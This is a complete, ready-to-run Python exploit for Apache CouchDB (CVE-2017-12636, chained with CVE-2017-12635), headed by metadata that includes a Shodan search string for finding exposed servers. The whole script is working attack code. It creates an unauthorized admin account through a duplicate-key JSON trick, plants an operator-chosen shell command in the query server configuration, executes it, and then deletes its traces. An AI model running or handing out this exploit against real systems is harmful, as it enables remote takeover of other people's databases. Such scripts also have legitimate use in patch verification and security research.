# Title: Apache CouchDB < 2.1.0 - Remote Code Execution
# Author: Cody Zacharias
# Shodan Dork: port:5984
# Vendor Homepage: http://couchdb.apache.org/
# Software Link: http://archive.apache.org/dist/couchdb/source/1.6.0/
# Version: <= 1.7.0 and 2.x - 2.1.0
# Tested on: Debian
# CVE : CVE-2017-12636
# References:
# https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
# https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/

# Proof of Concept: python exploit.py --priv -c "id" http://localhost:5984

#!/usr/bin/env python
from requests.auth import HTTPBasicAuth
import argparse
import requests
import re
import sys

def getVersion():
    version = requests.get(args.host).json()["version"]
    return version

def error(message):
    print(message)
    sys.exit(1)

def exploit(version):
    with requests.session() as session:
        session.headers = {"Content-Type": "application/json"}

        # Exploit privilege escalation
        if args.priv:
            try:
                payload = '{"type": "user", "name": "'
                payload += args.user
                payload += '", "roles": ["_admin"], "roles": [],'
                payload += '"password": "' + args.password + '"}'

                pr = session.put(args.host + "/_users/org.couchdb.user:" + args.user,
                    data=payload)

                print("[+] User " + args.user + " with password " + args.password + " successfully created.")
            except requests.exceptions.HTTPError:
                error("[-] Unable to create the user on remote host.")

        session.auth = HTTPBasicAuth(args.user, args.password)

        # Create payload
        try:
            if version == 1:
                session.put(args.host + "/_config/query_servers/cmd",
                        data='"' + args.cmd + '"')
                print("[+] Created payload at: " + args.host + "/_config/query_servers/cmd")
            else:
                host = session.get(args.host + "/_membership").json()["all_nodes"][0]
                session.put(args.host + "/_node/" + host + "/_config/query_servers/cmd",
                        data='"' + args.cmd + '"')
                print("[+] Created payload at: " + args.host + "/_node/" + host + "/_config/query_servers/cmd")
        except requests.exceptions.HTTPError as e:
            error("[-] Unable to create command payload: " + e)

        try:
            session.put(args.host + "/god")
            session.put(args.host + "/god/zero", data='{"_id": "HTP"}')
        except requests.exceptions.HTTPError:
            error("[-] Unable to create database.")

        # Execute payload
        try:
            if version == 1:
                session.post(args.host + "/god/_temp_view?limit=10",
                        data='{"language": "cmd", "map": ""}')
            else:
                session.post(args.host + "/god/_design/zero",
                        data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd"}')
            print("[+] Command executed: " + args.cmd)
        except requests.exceptions.HTTPError:
            error("[-] Unable to execute payload.")

        print("[*] Cleaning up.")

        # Cleanup database
        try:
            session.delete(args.host + "/god")
        except requests.exceptions.HTTPError:
            error("[-] Unable to remove database.")

        # Cleanup payload
        try:
            if version == 1:
                session.delete(args.host + "/_config/query_servers/cmd")
            else:
                host = session.get(args.host + "/_membership").json()["all_nodes"][0]
                session.delete(args.host + "/_node" + host + "/_config/query_servers/cmd")
        except requests.exceptions.HTTPError:
            error("[-] Unable to remove payload.")

def main():
    version = getVersion()
    print("[*] Detected CouchDB Version " + version)
    vv = version.replace(".", "")
    v = int(version[0])
    if v == 1 and int(vv) <= 170:
        exploit(v)
    elif v == 2 and int(vv) < 211:
        exploit(v)
    else:
        print("[-] Version " + version + " not vulnerable.")
        sys.exit(0)

if __name__ == "__main__":
    ap = argparse.ArgumentParser(
            description="Apache CouchDB JSON Remote Code Execution Exploit (CVE-2017-12636)")
    ap.add_argument("host", help="URL (Example: http://127.0.0.1:5984).")
    ap.add_argument("-c", "--cmd", help="Command to run.")
    ap.add_argument("--priv", help="Exploit privilege escalation (CVE-2017-12635).",
        action="store_true")
    ap.add_argument("-u", "--user", help="Admin username (Default: guest).",
            default="guest")
    ap.add_argument("-p", "--password", help="Admin password (Default: guest).",
            default="guest")
    args = ap.parse_args()
    main()